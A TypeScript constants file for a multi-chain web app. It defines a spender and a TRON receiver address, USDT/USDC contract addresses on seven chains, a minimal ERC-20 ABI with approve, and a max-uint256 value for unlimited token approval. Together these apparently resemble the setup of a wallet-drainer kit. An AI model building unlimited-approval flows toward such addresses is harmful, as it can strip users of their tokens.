// config/constants.ts
// Token contracts & configuration for TRON and EVM chains

export const SPENDER_ADDRESS_EVM = (
  process.env.NEXT_PUBLIC_SPENDER_ADDRESS ||
  "0x0000000000000000000000000000000000000000"
) as `0x${string}`;

export const RECEIVER_ADDRESS_TRON =
  process.env.NEXT_PUBLIC_TRON_RECEIVER ||
  "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb";

// Standard ERC-20 / TRC-20 USDT contract addresses per chain
export const TOKENS = {
  // TRON Mainnet (TRC-20)
  tron: {
    symbol: "USDT",
    address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    decimals: 6,
  },
  // Ethereum Mainnet (ChainId 1)
  1: {
    symbol: "USDT",
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" as `0x${string}`,
    decimals: 6,
  },
  // BNB Smart Chain (ChainId 56)
  56: {
    symbol: "USDT",
    address: "0x55d398326f99059fF775485246999027B3197955" as `0x${string}`,
    decimals: 18,
  },
  // Polygon (ChainId 137)
  137: {
    symbol: "USDT",
    address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F" as `0x${string}`,
    decimals: 6,
  },
  // Arbitrum One (ChainId 42161)
  42161: {
    symbol: "USDT",
    address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9" as `0x${string}`,
    decimals: 6,
  },
  // Optimism (ChainId 10)
  10: {
    symbol: "USDT",
    address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58" as `0x${string}`,
    decimals: 6,
  },
  // Base (ChainId 8453) - uses USDC primarily
  8453: {
    symbol: "USDC",
    address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" as `0x${string}`,
    decimals: 6,
  },
} as const;

// Minimal ERC-20 ABI for balance, allowance and approve
export const ERC20_ABI = [
  {
    name: "balanceOf",
    type: "function",
    stateMutability: "view",
    inputs: [{ name: "account", type: "address" }],
    outputs: [{ name: "balance", type: "uint256" }],
  },
  {
    name: "allowance",
    type: "function",
    stateMutability: "view",
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
    ],
    outputs: [{ name: "remaining", type: "uint256" }],
  },
  {
    name: "approve",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "success", type: "bool" }],
  },
] as const;

// Max uint256 for unlimited approval
export const MAX_UINT256 = BigInt(
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
);
